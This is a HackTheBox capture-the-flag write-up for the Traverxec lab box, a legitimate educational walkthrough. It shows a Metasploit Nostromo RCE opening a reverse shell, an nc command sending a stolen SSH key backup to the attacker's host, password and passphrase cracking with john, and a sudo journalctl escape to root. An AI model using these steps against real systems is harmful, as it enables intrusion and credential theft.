---
title: "HackTheBox Writeup: Traverxec"
date: 2020-04-10T22:59:48+02:00
oc: true
showdate: true
toc: true
tags:
  - hackthebox
  - ctf
  - writeup
---

Traverxec makes for an easy and fun little box for beginners, it doesn't present any particular challenges that other boxes haven't shown but even if it is not that original it is a perfect introduction to the website, or so I believe.

Anyway the path to root is very straightforward, a public exploit for Nostromo CMS is used to gain foothold and then a private RSA SSH key is found and its passhprase is cracked to grant us user access. A simple sudo abuse with a [GTFOBin](https://gtfobins.github.io/) is all we need from there to become superuser.

![img](/images/writeup-traverxec/1.png)

---

## Enumeration

A full nmap scan only shows SSH and HTTP open, with a web server running Nostromo 1.9.6:

```aaa
baud@kali:~/HTB/traverxec$ sudo nmap -sC -sV -p- -T4 -oA nmap 10.10.10.165
[sudo] password di baud: 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-29 19:22 CET
Nmap scan report for 10.10.10.165
Host is up (0.043s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
80/tcp open  http    nostromo 1.9.6
|_http-server-header: nostromo 1.9.6
|_http-title: TRAVERXEC
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 98.40 seconds
```

This is what the web server looks like, nothing interesting can be gathered from here, no secret pages found with web fuzzing tools either:

![img](/images/writeup-traverxec/2.png)

---

## Exploitation: Nostromo 1.9.6 Directory Traversal Remote Command Execution

Not that we need any secret pages since there exist [RCE exploits](https://www.exploit-db.com/exploits/47573) for Nostromo 1.9.6:

```aaa
msf5 > use exploit/multi/http/nostromo_code_exec
msf5 exploit(multi/http/nostromo_code_exec) > show options

Module options (exploit/multi/http/nostromo_code_exec):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT    80               yes       The target port (TCP)
   SRVHOST  0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT  8080             yes       The local port to listen on.
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                   no        The URI to use for this exploit (default is random)
   VHOST                     no        HTTP server virtual host


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic (Unix In-Memory)


msf5 exploit(multi/http/nostromo_code_exec) > set lhost 10.10.14.144
lhost => 10.10.14.144
msf5 exploit(multi/http/nostromo_code_exec) > set rhosts 10.10.10.165
rhosts => 10.10.10.165
msf5 exploit(multi/http/nostromo_code_exec) > run

[*] Started reverse TCP handler on 10.10.14.144:4444 
[*] Configuring Automatic (Unix In-Memory) target
[*] Sending cmd/unix/reverse_perl command payload
[*] Command shell session 1 opened (10.10.14.144:4444 -> 10.10.10.165:59074) at 2020-02-29 19:29:42 +0100

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
python -c 'import pty;pty.spawn("/bin/bash")'
www-data@traverxec:/usr/bin$
```

---

## Local enumeration

Once inside we can start taking a look around. The only user on the box appears to be David:

```aaa
www-data@traverxec:/$ ls -la /home
ls -la /home
total 12
drwxr-xr-x  3 root  root  4096 Oct 25 14:32 .
drwxr-xr-x 18 root  root  4096 Oct 25 14:17 ..
drwx--x--x  6 david david 4096 Dec  1 22:32 david
```

Inside nostromo's config directory is a .htpasswd file containing an md5crypt password hash ($1$ = md5crypt):

```aaa
www-data@traverxec:/var/nostromo/conf$ ls -la
ls -la
total 20
drwxr-xr-x 2 root daemon 4096 Oct 27 16:12 .
drwxr-xr-x 6 root root   4096 Oct 25 14:43 ..
-rw-r--r-- 1 root bin      41 Oct 25 15:20 .htpasswd
-rw-r--r-- 1 root bin    2928 Oct 25 14:26 mimes
-rw-r--r-- 1 root bin     498 Oct 25 15:20 nhttpd.conf
www-data@traverxec:/var/nostromo/conf$ cat .htpasswd
cat .htpasswd
david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
```

The password is easily cracked with john:

```aaa
baud@kali:~/HTB/traverxec$ /usr/sbin/john --format=md5crypt --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Press 'q' or Ctrl-C to abort, almost any other key for status
Nowonly4me       (david)
1g 0:00:01:40 DONE (2020-02-29 19:37) 0.009972g/s 105485p/s 105485c/s 105485C/s Noyoudo..Nowhere
Use the "--show" option to display all of the cracked passwords reliably
Session completed
baud@kali:~/HTB/traverxec$ /usr/sbin/john --show hash
david:Nowonly4me

1 password hash cracked, 0 left
```

This gives me a pair of credentials:

```aaa
User: david
Pass: Nowonly4me
```

The password however does not allow to log into SSH:

```aaa
baud@kali:~/HTB/traverxec$ ssh david@10.10.10.165
The authenticity of host '10.10.10.165 (10.10.10.165)' can't be established.
ECDSA key fingerprint is SHA256:CiO/pUMzd+6bHnEhA2rAU30QQiNdWOtkEPtJoXnWzVo.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.165' (ECDSA) to the list of known hosts.
david@10.10.10.165's password: 
Permission denied, please try again.
david@10.10.10.165's password:
```

And won't work with su either:

```aaa
www-data@traverxec:/usr/bin$ su david
su david
Password: Nowonly4me

su: Authentication failure
```

As it turns out, that password is nothing but a rabbit hole.

The nhttpd.conf file mentions a public_www directory:

```aaa
$ cat nhttpd.conf
cat nhttpd.conf
# MAIN [MANDATORY]

servername		traverxec.htb
serverlisten		*
serveradmin		david@traverxec.htb
serverroot		/var/nostromo
servermimes		conf/mimes
docroot			/var/nostromo/htdocs
docindex		index.html

# LOGS [OPTIONAL]

logpid			logs/nhttpd.pid

# SETUID [RECOMMENDED]

user			www-data

# BASIC AUTHENTICATION [OPTIONAL]

htaccess		.htaccess
htpasswd		/var/nostromo/conf/.htpasswd

# ALIASES [OPTIONAL]

/icons			/var/nostromo/icons

# HOMEDIRS [OPTIONAL]

homedirs		/home
homedirs_public		public_www
```

Here some guess work is required. Using *find* to look for the location of this public_www directory does not return any results, and perhaps this should give us a hint: maybe *find* can't find the directory because it doesn't have the necessary rights to access its parent directory, which might as well be /home as seen in the .conf file above.

In fact, we can confirm that the public_www folder exists within David's home folder:

```aaa
$ ls -la /home/david/public_www
ls -la /home/david/public_www
total 16
drwxr-xr-x 3 david david 4096 Oct 25 15:45 .
drwx--x--x 6 david david 4096 Apr  4 05:26 ..
-rw-r--r-- 1 david david  402 Oct 25 15:45 index.html
drwxr-xr-x 2 david david 4096 Oct 25 17:02 protected-file-area
```

Because of badly configured permissions we can access it despite it being located inside /home/david/ and find an important looking folder:

```aaa
$ ls -la /home/david/public_www/protected-file-area
ls -la /home/david/public_www/protected-file-area
total 16
drwxr-xr-x 2 david david 4096 Oct 25 17:02 .
drwxr-xr-x 3 david david 4096 Oct 25 15:45 ..
-rw-r--r-- 1 david david   45 Oct 25 15:46 .htaccess
-rw-r--r-- 1 david david 1915 Oct 25 17:02 backup-ssh-identity-files.tgz
```

Transfer the file to our machine to analyze it:

```aaa
$ nc -w 3 10.10.14.251 9999 < /home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz
```

Receive and unpack the file, it contains a backup of David's .ssh folder:

```aaa
baud@kali:~/HTB/traverxec$ nc -lvnp 9999 > ssh-files.tgz
listening on [any] 9999 ...
connect to [10.10.14.251] from (UNKNOWN) [10.10.10.165] 60388
baud@kali:~/HTB/traverxec$ file ssh-files.tgz 
ssh-files.tgz: gzip compressed data, last modified: Fri Oct 25 21:02:59 2019, from Unix, original size modulo 2^32 10240
baud@kali:~/HTB/traverxec$ tar zxvf ssh-files.tgz 
home/david/.ssh/
home/david/.ssh/authorized_keys
home/david/.ssh/id_rsa
home/david/.ssh/id_rsa.pub
```

---

## Privilege escalation #1: SSH via cracked RSA backup key
Use the RSA key to login after changing permissions to it:

```aaa
baud@kali:~/HTB/traverxec/home/david/.ssh$ ssh -i id_rsa david@10.10.10.165
Enter passphrase for key 'id_rsa': 
```

The key is encrypted with a passphrase which is not the same one found earlier, so it is cracked with john:

```aaa
baud@kali:~/HTB/traverxec/home/david/.ssh$ /usr/share/john/ssh2john.py id_rsa > crackThis
baud@kali:~/HTB/traverxec/home/david/.ssh$ /usr/sbin/john --wordlist=/usr/share/wordlists/rockyou.txt crackThis
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
hunter           (id_rsa)
1g 0:00:00:09 DONE (2020-04-04 11:41) 0.1083g/s 1553Kp/s 1553Kc/s 1553KC/s *7¡Vamos!
Session completed
```

Now we can login as David and grab the first flag thanks to the newly found "hunter" passphrase:

```aaa
baud@kali:~/HTB/traverxec/home/david/.ssh$ ssh -i id_rsa david@10.10.10.165
Enter passphrase for key 'id_rsa': 
Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64
Last login: Sat Apr  4 05:40:43 2020 from 10.10.15.20
david@traverxec:~$
```

---

## Privilege escalation #2: journalctl root shell escape

A script in the bin folder inside David's home calls /usr/bin/journalctl, a program that is found in the list of [GTFObins](https://gtfobins.github.io/gtfobins/journalctl/):

```aaa
david@traverxec:~$ cat bin/server-stats.sh
#!/bin/bash

cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
```

The pipe to *cat* can be removed to start journalctl interactively by calling *less* (journalctl's default behavior), and from there shell commands can be executed by tpying "!". Because the program runs as root thanks to sudo, a root shell is started:

![img](/images/writeup-traverxec/3.png)
